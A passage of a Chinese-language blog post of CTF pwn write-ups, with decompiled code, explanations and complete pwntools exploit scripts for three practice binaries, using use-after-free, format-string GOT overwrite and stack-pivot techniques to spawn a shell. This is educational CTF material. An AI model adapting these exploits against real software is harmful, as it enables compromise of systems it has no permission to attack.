class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br><span class="line">    </span><br><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">ydsneedgirlfriend2</span> </span><br><span class="line"><span class="attr">ydsneedgirlfriend2:</span> <span class="string">ELF</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">x86-64,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> </span><br><span class="line"><span class="string">interpreter</span> <span class="string">/lib64/l,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">3.2</span><span class="number">.0</span><span class="string">,</span> <span class="string">BuildID[sha1]=9adecad0c22b07033922aa4a67a6040622c8be81,</span> <span class="string">not</span> <span class="string">stripped</span></span><br></pre></td></tr></table></figure>

<p>64位 elf 程序，开启NX保护。<br>拖入ida：<br>main函数：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// eax</span></span><br><span class="line">  _BYTE v4[<span class="number">6</span>]; <span class="comment">// [rsp-16h] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  myinit();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();                                   <span class="comment">//   puts(&amp;byte_400E6F);</span></span><br><span class="line">                                                <span class="comment">//   puts("1.add a girlfriend");</span></span><br><span class="line">                                                <span class="comment">//   puts("2.dele a girlfriend");</span></span><br><span class="line">                                                <span class="comment">//   puts("3.show a girlfriend");</span></span><br><span class="line">                                                <span class="comment">//   puts("4.exit");</span></span><br><span class="line">                                                <span class="comment">//   return puts("u choice :");</span></span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, v4, <span class="number">6u</span>LL);</span><br><span class="line">      choice = atoi(v4);</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      dele();                                   <span class="comment">// UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( choice == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只有3个 程序功能就是: </p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="built_in">add</span> <span class="keyword">a</span> girlfriend<span class="comment">");</span></span><br><span class="line"><span class="number">2</span>.dele <span class="keyword">a</span> girlfriend<span class="comment">");</span></span><br><span class="line"><span class="number">3</span>.show <span class="keyword">a</span> girlfriend<span class="comment">");</span></span><br></pre></td></tr></table></figure>

<p>我们看下 add函数功能：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Zvut.png" alt="J9Zvut.png"><br><br>我们可以看到 这里有两个 malloc，<br>第一个malloc(0x10)是 申请的 struct girlfriend结构体，</p>
<p>第一个malloc(v2),这里的v2 是我们可控制的size，是申请的 name 的chunk</p>
<p>我们可在add 函数里 推出 这个程序 使用了 下面的结构体</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">girlfriends</span>&#123;</span>                 <span class="comment">//girlfriends[0] = malloc(0x10uLL)</span></span><br><span class="line">	 <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> name_chunk_addr;      <span class="comment">//v0 = (void **)girlfriends[0];*v0 = malloc(v2);</span></span><br><span class="line">	 <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> print_girlfriend_name; <span class="comment">//girlfriends[0][1] = print_girlfriend_name;</span></span><br><span class="line">	&#125;girlfriends;</span><br></pre></td></tr></table></figure>

<p>看下show 功能：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZzHf.png" alt="J9ZzHf.png"><br><br>如果 结构体存在，则 执行struct girlfriends-&gt; print_girlfriend_name函数，我们看些这个函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">print_girlfriend_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实就是 个puts 出 struct girlfriends-&gt; name中的数据。<br>我们再看下 delete函数：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9epE8.png" alt="J9epE8.png"><br><br>这个程序的洞 其实就是在这了，因为 free 掉chunk后 却没有进行 置零 操作。delete后，我们仍可以可以控制 chunk。<br>而这题 又因为存在后门函数，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9e9US.png" alt="J9e9US.png"><br><br>所以我们可以这样 首先 申请 结构体， girlfriends 0，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9eC4g.png" alt="J9eC4g.png"><br><br>然后 我们 delete  girlfriends 0，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9eF3j.png" alt="J9eF3j.png"><br><br>可以发现 bins 链上 有两个  free chunk，且由于 UAF漏洞 delete后 结构体 0的指针仍然存在。</p>
<p>然后 再申请一个 0x10 的的结构体 girlfriends 0<br>因为 结构体 0的指针仍然存在，所以 再add 函数中 就不会 再去首先申请 一个 0x10的结构题去做 新的girlfriends 0 了，而是 直接让我们 输入 size（这里就是0x10了），去申请 name 所在的堆块，我们观察bins 上的chunk，我们首先申请出来的会是 0x246960的堆块，且这个又是  girlfriends 0 结构体，我们只要把这个结构体 的print_girlfriend_name 指针给覆写 成后门函数就可以了，这样当我们执行 show 函数时，就会  调用print_girlfriend_name 时 就实际会 调用 backdoor，从而拿到shell。<br><br><img src="https://s1.ax1x.com/2020/04/15/J9eiCQ.png" alt="J9eiCQ.png"><br><br>我们可以看到 如我们上面的所述，呈现的结果与我们的期望一执，可以看到 bins上的0x2469350 被申请当作  girlfriends 0中的name 堆块了，同时又是 girlfriends 0结构体本身。<br>我们再接着 show(0)其实就可 pwn 掉程序了。<br>完整exp  如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">elf = ELF(<span class="string">'./ydsneedgirlfriend2'</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)<span class="comment">#18</span></span><br><span class="line">p = process(<span class="string">'./ydsneedgirlfriend2'</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn",27625)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"u choice :\n"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Please input the length of her name:\n"</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Please tell me her name:\n"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#def edit(index,content):</span></span><br><span class="line"><span class="comment">#	p.sendlineafter("choice: ",'2')</span></span><br><span class="line"><span class="comment">#	p.sendlineafter("idx?",str(index))</span></span><br><span class="line"><span class="comment">#	p.sendlineafter("content:",content)</span></span><br><span class="line"><span class="comment">#	p.recvuntil("Done!\n")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"u choice :\n"</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"u choice :\n"</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(backdoor)</span><br><span class="line">add(<span class="number">0x10</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h2><p>这题  是个64位的elf 程序，动态链接 开启了NX和canary保护。<br>而考察 其实 是 利用了格式化字符任意写,另外 我们要知道的是  当函数返回的时候 会比较canary的 值 是否发生变化，如果不一致，就触发 __stack_chk_fail 函数。<br>拖入ida:</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]                       </span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);             <span class="comment">//存在栈溢出 漏洞，但有canary 保护，虽然可通过任意地址写 可泄露canary，但程序只运行 一边。不可取</span></span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);                  <span class="comment">//格式化字符串 漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">backdoor</span><span class="params">()</span>        <span class="comment">//0x400626</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面代码中的注释可知，栈溢出的方法 不可取， 因为程序开启了Canary 当函数返回的时候 会比较canary的 值 是否发生变化，如果不一致，就触发 __stack_chk_fail 函数。且程序中 含有后门函数。 我们可通过格式化字符串写 将backdoor_addr写入 __stack_chk_fail_got 中 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./r2t4"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26640</span>)</span><br><span class="line">elf=ELF(<span class="string">"./r2t4"</span>)</span><br><span class="line">offset=<span class="number">6</span></span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">backdoor=<span class="number">0x400626</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">__stack_chk_fail is 0x601018</span></span><br><span class="line"><span class="string">backdoor is 0x400626</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"__stack_chk_fail is "</span>+hex(__stack_chk_fail)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"backdoor is "</span>+hex(backdoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">"a"</span>+<span class="string">"%"</span>+str(backdoor<span class="number">-1</span>)+<span class="string">"c%8$lln"</span>+p64(__stack_chk_fail)<span class="comment">#  0x30</span></span><br><span class="line">payload+=(<span class="number">0x30</span><span class="number">-8</span>-len(payload))*<span class="string">'a'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,"b main")</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最后关于 格式化字符串漏洞的学习 大家可以 去i春秋上的 一个 叫教程里(下面的链接)去学习下：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bbs.ichunqiu.com/thread<span class="string">-43624</span><span class="string">-1</span><span class="string">-1</span>.html</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>这道题，感觉还是 增加了不少知识。<br>我们 直接分析 ida伪代码吧！</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome, my friend. What's your name?"</span>);</span><br><span class="line">  vul();                                                   <span class="comment">// 程序内容都是在 vul函数中呢</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">*************************************************************</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]                       // s的偏移是 ebp-0x28</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);                              <span class="comment">//首先 将 s位置开始的 0x20大小的size 的内容都 置为 0</span></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);                                 <span class="comment">//我们可 最多输入 0x30字节数据    </span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);                          <span class="comment">//输出我们的输入的内容</span></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);                                 <span class="comment">//我们可 最多输入 0x30字节数据   </span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);                   <span class="comment">//再 输出我们的输入的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里 我们利用的 printf 输出函数 是遇到 “\x00”才会 停止输出的，所以 我们 第一次输入 通过 printf  来 leak 出栈地址。而栈地址之间的偏移 是固定不会变的，我们可计算得到 s所在的栈地址。然后我们在s处构造以下 payload：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s_addr=zhan_addr-(0xff962d44-0xff962c60)               </span><br><span class="line">sh_addr=s_addr+0xc</span><br><span class="line"></span><br><span class="line">pd2=p32(system_plt)+p32(0xdeadbeef)+p32(sh_addr)+<span class="string">"sh\x00\x00"</span>//我们在 s_addr处 写上 我们的 system_plt地址，s_addr+0xc处写入字符串<span class="string">"sh\x00"</span>,将这个地址放在 s_addr+0x8处作为参数</span><br><span class="line">pd2=pd2.ljust(0x28,<span class="string">"a"</span>)</span><br><span class="line">pd2+=p32(s_addr-0x4)                             //这个可以看上面的 [Black Watch 入群题]PWN那题的具体分析，ebp 覆盖为 在rop攻击链所在地址-0x4，ret_addr 覆盖成 leave_ret</span><br><span class="line">pd2+=p32(leave_ret)</span><br></pre></td></tr></table></figure>

<p>即，在 我们 泄露出的 s所在 地址处  写入 我们的 rop攻击链，然后可根据 (参考上面[Black Watch 入群题]PWN那题  的详细分析) 栈迁移的利用方式，在 ebp 覆盖为 在rop攻击链所在地址-0x4，ret_addr 覆盖成 leave_ret，从而 实现 栈迁移 使得程序 执行流 去执行 到  我们构造的  rop 攻击链，拿到 shell。</p>
<p>我写出 以下exp：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#p=process("./ciscn_2019_es_2")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,29391)</span><br><span class="line">elf=ELF(<span class="string">"./ciscn_2019_es_2"</span>)</span><br><span class="line"></span><br><span class="line">system_plt=elf.plt[<span class="string">"system"</span>]</span><br><span class="line">leave_ret=0x08048562</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pd=<span class="string">"a"</span>*(0x28-0x4)                                     <span class="comment">#经gdb调试 我们可 在 偏移 ebp-0x28-4的位置存着的数据 是一个栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">"Welcome, my friend. What's your name?\n"</span>)<span class="comment"># 通过偏移  得到 s_addr </span></span><br><span class="line">p.send(pd)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*(0x28-4))</span><br><span class="line">zhan_addr=u32(p.recv(4))</span><br><span class="line">print <span class="string">"zhan_addr : "</span>+hex(zhan_addr)</span><br><span class="line">s_addr=zhan_addr-(0xff962d44-0xff962c60)</span><br><span class="line">sh_addr=s_addr+0xc</span><br><span class="line"></span><br><span class="line">pd2=p32(system_plt)+p32(0xdeadbeef)+p32(sh_addr)+<span class="string">"sh\x00\x00"</span>//我们在 s_addr处 写上 我们的 system_plt地址，s_addr+0xc处写入字符串<span class="string">"sh\x00"</span>,将这个地址放在 s_addr+0x8处作为参数</span><br><span class="line">pd2=pd2.ljust(0x28,<span class="string">"a"</span>)</span><br><span class="line">pd2+=p32(s_addr-0x4)                             //这个可以看上面的 [Black Watch 入群题]PWN那题的具体分析，ebp 覆盖为 在rop攻击链所在地址-0x4，ret_addr 覆盖成 leave_ret</span><br><span class="line">pd2+=p32(leave_ret)</span><br><span class="line">p.send(pd2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>可以成功 拿到shell。</p>
<h1 id="师傅们，今天-你pwn-了嘛！一起来学二进制吧。"><a href="#师傅们，今天-你pwn-了嘛！一起来学二进制吧。" class="headerlink" title="师傅们，今天 你pwn 了嘛！一起来学二进制吧。"></a>师傅们，今天 你pwn 了嘛！一起来学二进制吧。</h1>
      
    </div>

    <div>
      
        
      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/PWN/" rel="tag">#PWN</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/04/29/House Of Force/" rel="next" title="House Of Force">
                <i class="fa fa-chevron-left"></i> House Of Force
              </a>
            
          </div>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="木头">
          <p class="site-author-name" itemprop="name">木头</p>
          <p class="site-description motion-element" itemprop="description">做个靠谱的人！</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">56</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">20</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          
		  <br>
		  <span id="busuanzi_container_site_uv">
			<b><span id="busuanzi_value_site_uv"></span></b><br>
			<span class="site-state-item-name">访客</span>
			</span>


        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=453175619&auto=0&height=32"></iframe>

    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=805197&auto=1&height=32"></iframe>
    
		<br>
		<div align="left" font-family: "arial","microsoft yahei","黑体","宋体",sans-serif>
		<b><h1>个人简介</h1></b>
		<p>姓名：木头<br>
		性别：男<br>
		QQ：1594783824<br>
		爱好：书,球,歌<br>
		主要奖项： xxx</p>
		</div>
		<br>

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">
            
              
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-pz-hackover-2016"><span class="nav-number">1.1.</span> <span class="nav-text">ez_pz_hackover_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyfengshui-33c3-2016"><span class="nav-number">1.2.</span> <span class="nav-text">babyfengshui_33c3_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babystack"><span class="nav-number">1.3.</span> <span class="nav-text">bjdctf_2020_babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Black-Watch-入群题-PWN"><span class="nav-number">1.4.</span> <span class="nav-text">[Black Watch 入群题]PWN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-ydsneedgirlfriend2"><span class="nav-number">1.5.</span> <span class="nav-text">[BJDCTF 2nd]ydsneedgirlfriend2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-r2t4"><span class="nav-number">1.6.</span> <span class="nav-text">[BJDCTF 2nd]r2t4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 